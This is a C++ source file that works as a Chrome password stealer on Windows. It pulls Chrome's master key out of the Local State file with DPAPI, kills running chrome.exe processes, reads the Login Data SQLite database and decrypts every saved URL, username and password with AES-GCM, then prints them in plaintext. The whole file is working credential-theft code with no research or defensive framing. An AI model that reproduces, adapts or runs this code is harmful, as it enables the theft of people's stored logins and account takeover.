#include <iostream>
#include <fstream>
#include <string>
#include <vector>
#include <windows.h>
#include <tlhelp32.h> 
#include <wincrypt.h>
#include <nlohmann/json.hpp>
#include <sqlite3.h>
#include <openssl/evp.h>
#include <openssl/aes.h>
#include <openssl/rand.h>
#include <shlobj.h>

// Include necessary headers
#pragma comment(lib, "crypt32.lib")
#pragma comment(lib, "shlwapi.lib")
#pragma comment(lib, "sqlite3.lib")

using json = nlohmann::json;

// Function to decode Base64 string
std::vector<BYTE> base64_decode(const std::string &in) {
    std::string base64_chars =
        "ABCDEFGHIJKLMNOPQRSTUVWXYZ"
        "abcdefghijklmnopqrstuvwxyz"
        "0123456789+/";

    std::vector<BYTE> out;
    std::vector<int> T(256, -1);
    for (int i = 0; i < 64; i++) T[base64_chars[i]] = i;

    int val = 0, valb = -8;
    for (unsigned char c : in) {
        if (T[c] == -1) break;
        val = (val << 6) + T[c];
        valb += 6;
        if (valb >= 0) {
            out.push_back((val >> valb) & 0xFF);
            valb -= 8;
        }
    }
    return out;
}

// Function to get the secret key from the Local State file
std::string getSecretKey(const std::string &localStatePath) {
    std::ifstream file(localStatePath);
    if (!file.is_open()) {
        std::cerr << "Could not open Local State file." << std::endl;
        return "";
    }

    json localState;
    file >> localState;
    file.close();

    // Get the encrypted_key from the JSON content
    std::string encryptedKeyBase64 = localState["os_crypt"]["encrypted_key"];
    std::vector<BYTE> encryptedKey = base64_decode(encryptedKeyBase64);

    // Remove DPAPI prefix
    encryptedKey.erase(encryptedKey.begin(), encryptedKey.begin() + 5);

    // Decrypt the key using CryptUnprotectData
    DATA_BLOB inBlob, outBlob;
    inBlob.pbData = encryptedKey.data();
    inBlob.cbData = static_cast<DWORD>(encryptedKey.size());

    if (CryptUnprotectData(&inBlob, nullptr, nullptr, nullptr, nullptr, 0, &outBlob)) {
        std::string secretKey(reinterpret_cast<char*>(outBlob.pbData), outBlob.cbData);
        LocalFree(outBlob.pbData);
        return secretKey;
    } else {
        std::cerr << "Failed to decrypt the secret key." << std::endl;
        return "";
    }
}

// Function to decrypt the payload
std::string decryptPayload(const std::string &cipherText, const std::string &secretKey) {
    std::string iv = cipherText.substr(3, 12); // Initialisation vector
    std::string encryptedPassword = cipherText.substr(15, cipherText.size() - 31);

    EVP_CIPHER_CTX *ctx = EVP_CIPHER_CTX_new();
    EVP_DecryptInit_ex(ctx, EVP_aes_256_gcm(), NULL, (unsigned char*)secretKey.data(), (unsigned char*)iv.data());

    std::vector<unsigned char> decryptedText(encryptedPassword.size());
    int len;
    EVP_DecryptUpdate(ctx, decryptedText.data(), &len, (unsigned char*)encryptedPassword.data(), encryptedPassword.size());

    int plaintext_len = len;
    EVP_CIPHER_CTX_free(ctx);

    return std::string(decryptedText.begin(), decryptedText.begin() + plaintext_len);
}

void terminateChrome() {
    HANDLE hProcessSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hProcessSnap == INVALID_HANDLE_VALUE) {
        std::cerr << "Error creating snapshot: " << GetLastError() << std::endl;
        return;
    }

    PROCESSENTRY32 pe;
    pe.dwSize = sizeof(PROCESSENTRY32);

    if (Process32First(hProcessSnap, &pe)) {
        do {
            if (strcmp(pe.szExeFile, "chrome.exe") == 0) {
                HANDLE hProcess = OpenProcess(PROCESS_TERMINATE, FALSE, pe.th32ProcessID);
                if (hProcess) {
                    TerminateProcess(hProcess, 0);
                    CloseHandle(hProcess);
                }
            }
        } while (Process32Next(hProcessSnap, &pe));
    }

    CloseHandle(hProcessSnap);
}

// Function to read the login data from the SQLite database
void extractPasswords(const std::string &loginDataPath, const std::string &secretKey) {

    // Terminate Chrome processes
    terminateChrome();

    sqlite3 *db;
    if (sqlite3_open(loginDataPath.c_str(), &db) != SQLITE_OK) {
        std::cerr << "Failed to open database." << std::endl;
        return;
    }

    std::string query = "SELECT action_url, username_value, password_value FROM logins";
    sqlite3_stmt *stmt;
    if (sqlite3_prepare_v2(db, query.c_str(), -1, &stmt, NULL) != SQLITE_OK) {
        std::cerr << "Failed to prepare statement." << std::endl;
        sqlite3_close(db);
        return;
    }

    while (sqlite3_step(stmt) == SQLITE_ROW) {
        std::string url = reinterpret_cast<const char*>(sqlite3_column_text(stmt, 0));
        std::string username = reinterpret_cast<const char*>(sqlite3_column_text(stmt, 1));
        std::string cipherText = std::string(reinterpret_cast<const char*>(sqlite3_column_blob(stmt, 2)), sqlite3_column_bytes(stmt, 2));

        std::string decryptedPassword = decryptPayload(cipherText, secretKey);
        std::cout << "URL: " << url << std::endl;
        std::cout << "Username: " << username << std::endl;
        std::cout << "Password: " << decryptedPassword << std::endl;
        std::cout << "-----------------------------------" << std::endl;
    }

    sqlite3_finalize(stmt);
    sqlite3_close(db);
}

int main() {
    std::string userProfile = getenv("USERPROFILE");
    std::string localStatePath = userProfile + "\\AppData\\Local\\Google\\Chrome\\User Data\\Local State";
    std::string loginDataPath = userProfile + "\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Login Data";

    std::string secretKey = getSecretKey(localStatePath);
    if (!secretKey.empty()) {
        extractPasswords(loginDataPath, secretKey);
    }
    std::cin.get();

    return 0;
}
